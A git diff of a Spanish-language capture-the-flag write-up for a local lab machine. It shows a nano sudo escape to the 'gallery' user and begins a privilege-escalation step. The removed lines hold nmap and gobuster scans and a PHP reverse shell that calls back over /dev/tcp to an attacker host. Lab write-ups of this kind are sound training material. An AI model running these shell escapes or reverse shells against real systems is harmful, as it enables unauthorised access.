@@ -42,7 +42,7 @@ export TERM=xterm
 Una vez tratada, ejecutaremos `sudo -l` y encontraremos `(gallery) NOPASSWD: /bin/nano`
 <img width="572" height="174" alt="image" src="https://github.com/user-attachments/assets/eacedecf-628b-47ad-acdd-eb1d99b11da1" />
 
-Por lo que de acuerdo con [GTFObins](https://gtfobins.org/gtfobins/nano/#shell) ejecutaremos los siguiente comando:
+Por lo que de acuerdo con [GTFObins](https://gtfobins.org/gtfobins/nano/#shell) ejecutaremos los siguiente comandos:
 ```
 sudo -u gallery /bin/nano
 Ctrl+R Ctrl+X
@@ -50,21 +50,7 @@ reset; sh 1>&0 2>&0
 ```
 Y habremos obtenido acceso al usuario `gallery`
 
+## Paso N5: Escalando privilegios
+Si ejecutamos `sudo -l` estando en el usuario `gallery` veremos `(ALL) NOPASSWD: /usr/local/bin/runme`
+<img width="561" height="124" alt="image" src="https://github.com/user-attachments/assets/a03a2946-9b39-4c57-925d-d7f1418968ef" />
 
-
-raw code
-```
-nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000 -oG open_ports
-gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://172.17.0.2/ -x php,html
-
-
---- php ---
-<?php
-system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
-?>
----
-
-
-
-
-```
